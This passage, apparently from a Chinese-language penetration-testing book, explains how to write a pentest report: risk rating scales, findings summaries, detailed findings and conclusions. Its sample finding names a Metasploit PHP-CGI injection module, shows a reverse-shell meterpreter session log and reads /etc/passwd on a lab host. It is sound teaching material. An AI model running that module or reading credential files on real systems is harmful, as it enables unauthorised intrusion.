  \n如果您选择使用自己的风险评级图表，请保持一致并在所有任务中使用。如果您在图表之间来回切换，您可能会让自己和客户感到困惑。这种不一致可能会伤害您，尤其是在您最终为同一客户进行重复测试时。某物在一个图表中可能是极端的，而在另一个图表中是高的，术语的切换只会导致混淆。\n\
  \n我使用渗透测试执行标准定义的风险图表，因为我发现它是最全面的。以下是对此风险图表的复制，供您审阅：\n\n## 信息安全风险评级尺度\n\n| 级别 | 描述\
  \ |\n|---|---|\n| **极端** 13-15 | 安全控制被破坏的极端风险，可能因此导致灾难性财务损失 |\n| **高** 10-12 | 安全控制被破坏的高风险，可能因此导致重大财务损失\
  \ |\n| **提高** 7-9 | 安全控制被破坏的提高风险，可能因此导致实质性财务损失 |\n| **中等** 4-6 | 安全控制被破坏的中等风险，可能因此导致有限财务损失\
  \ |\n| **低** 1-3 | 安全控制被破坏的低风险，可能因此导致可衡量的负面影响 |\n\n我喜欢这个图表的几点。第一，级别数量充足。我发现有些图表选项太少。例如，使用低、中、高并不能对风险进行任何合理化。如果一个发现非常糟糕需要立即修复，而另一个发现也很糟糕需要尽快修复而不是以后修复，根据图表，一个将是高，另一个是中。对我来说，那个中等会被忽视并且可能永远不会更新。中等没有高或极端同样的紧迫感。\n\
  \n我喜欢这个图表的另一点是使用的颜色。它们在其他应用中具有非常相似的含义。例如，红色往往是最糟糕的。在监控应用中，红色通常表示宕机情况。或者，在驾驶时，它意味着停止移动。与红色类似，黄色在其他应用中也有类似含义。监控系统中的黄色通常意味着出了问题但未宕机。它可能存在一些丢包但仍可访问。在驾驶中，它意味着要谨慎。你仍然可以驾驶并通过路口，但要小心，因为红灯即将到来。最后，还有绿色。使用过去的类似例子，绿色往往在光谱的另一侧，无论我们谈论的是驾驶还是服务器监控应用。\n\
  \n我喜欢这个图表的最后一件事是数字参考。如果我们有色盲的个人审阅这些报告，他们将无法获得严重程度的真实表示，因为他们可能无法辨别颜色。数字使我们能够在没有颜色的情况下也显示规模。数字越大威胁越大，而数字越小威胁越小。永远不要认为每个人都能看到颜色图表非常重要。\n\
  \n## 发现摘要\n\n这在受众层面上与执行摘要非常相似。这应该是一个相对较小的部分，包括所发现内容的高层次摘要。我倾向于使用显示所发现内容的图形。一图胜千言，我完全同意这一说法。带有风险分解的彩色饼图将非常快速地总结报告的紧迫性。使用与风险评级相同的语言和分类，以及颜色编码。一致性是关键。确保在此处只陈述事实，而不是任何主观陈述。这真的只是高层次的事实。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_237_0.png)\n\n一些渗透测试人员更喜欢显示所执行测试的摘要而不是风险。真的取决于渗透测试人员以及他们认为什么更有价值。对我来说，风险摘要更有价值，尤其对高层管理人员。他们往往不想了解或不需要了解服务器上存在多少设计缺陷或缺少补丁，而更关注对业务的整体风险。\n\
  \n以下是我的图形类型的示例，再次保持前面讨论的相同外观和感觉：\n\n## 发现摘要\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_238_0.png)\n\
  \n## 详细发现\n\n本节是渗透测试报告的核心。它将列出我们在各种测试中发现的所有问题，按风险从高到低排序。本节应具有技术性并包含尽可能多的细节。这将是技术受众深入阅读以更好地了解问题是什么以及如何可能进行修复的部分。就在那里我刚刚说了一个重要的声明。我总是在漏洞中包含一个部分，说明我的建议或修复选项。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_238_1.png)\n\n有时漏洞或发现看起来和感觉非常相似。作为一名安全专业人员，也是执行测试的人，我往往对当前问题有更深入的了解。正因为如此，我总是会解释我的建议或修复选项。我不想让客户自己去弄明白，因为有时他们可能会选择错误的修复方式。\n\
  \n此部分在不同渗透测试人员或安全公司之间的格式可能差异很大。您可以将所有发现以某种图表形式、段落形式、嵌入图形中或表格格式呈现。各有所好。我最喜欢表格格式。\n\
  \n在这种表格格式中，每个主要部分都是一个漏洞或发现。这样它将成为主要焦点。在该漏洞中，我将包含以下信息，对每个漏洞都相同，且所有字段都已填写：\n\n- 漏洞/发现名称\n\
  - 漏洞/发现描述\n- 环境风险评级\n- 漏洞的详细信息\n- 建议/修复措施\n- 外部 CVE 或其他参考\n\n再次提醒，您可以随意自定义流程、名称等。但是，请确保提供的数据对客户相关，使用客户能够理解的语言，并提供修复信息。\n\
  \n根据漏洞以及我在测试中获得的证据，我将包含截图、图表和攻击场景等项目。以下是我的实验室中一次测试的示例：\n\n```\nPHP-CGI Argument\
  \ Injection\n```\n\n描述：某些版本的 PHP 存在漏洞，允许在查询字符串中注入参数，然后传递给 CGI，最终导致远程代码执行。\n\n严重性：高\
  \ (12)\n\n详细说明：在对位于 192.168.33.21 且在范围内的特定 Web 服务器进行漏洞评估期间，PHP 版本被标记为存在此漏洞。发现此问题后，尝试了已验证的攻击。使用\
  \ Metasploit 框架中的 msfconsole，我使用了与发现的漏洞匹配的以下 exploit：\n\n```\nexploit/multi/http/php_cgi_arg_injection\n\
  ```\n\n加载此 exploit 并将我的 RHOST 变量设置为远程主机后，我能够打开一个 meterpreter 会话，如下所示：\n\n```\nmsf\
  \ exploit(php_cgi_arg_injection) > exploit\n\n[*] Started reverse TCP handler on\
  \ 192.168.87.129:4444\n[*] Sending stage (34122 bytes) to 192.168.87.130\n[*] Meterpreter\
  \ session 1 opened (192.168.87.129:4444 -> 192.168.87.130:33595) at 2017-01-27 10:15:00\
  \ -0500\n\nmeterpreter >\n```\n\n从该提示符开始，我能够获取远程机器上的敏感文件以及其他潜在的恶意活动。以下截图验证了获取敏感文件的能力：\n\
  \n```\nmeterpreter > cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\n\
  bin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\n\
  games:x:5:60:games:/usr/games:/bin/sh\n```\n\n- 建议、修复措施：升级 PHP 到不受影响的已修补版本。这包括 5.4.3\
  \ 及以上版本。\n- 外部参考：CVE-2012-1823 EDB-25986\n  OSVDB-81633 OSVDB-93979\n\n此示例将所有内容联系起来，并为\
  \ C 级管理人员提供高层信息，以便他们决定是否处理该问题，同时为员工提供有关如何修复和如何测试的技术细节。\n\n## 结论\n\n结论收尾所有松散的线索，并对整个\
  \ engagement 进行最终概述。本节应包括您 engagement 的概要以及为何聘请您。还请务必重述渗透测试的原始目标。完成所有这些后，请务必重申您如何实现这些原始目标。提供几个具体示例来展示这是如何完成的以及这些服务如何为组织增加价值。始终以积极的语气结束结论，并说明您将如何继续渗透测试服务以帮助客户维护其安全状况。\n\
  \n## 附录 A - 使用的工具\n\n在附录中，我喜欢列出我使用的所有各种工具以及其版本。这将使公司了解用于各种攻击的工具，以防他们想在内部执行类似测试。我认为这对利益相关者来说具有极大的价值。太多渗透测试人员会让客户知道存在的问题，但却不提供工具来确保他们在必要时能够重现问题。\n\
  \n您提供的信息由您决定。我倾向于包含我用于测试的任何硬件和软件平台。随附的信息中包括工具列表、这些工具的版本以及这些工具的描述。以下是我在渗透报告中使用的语法示例：\n\
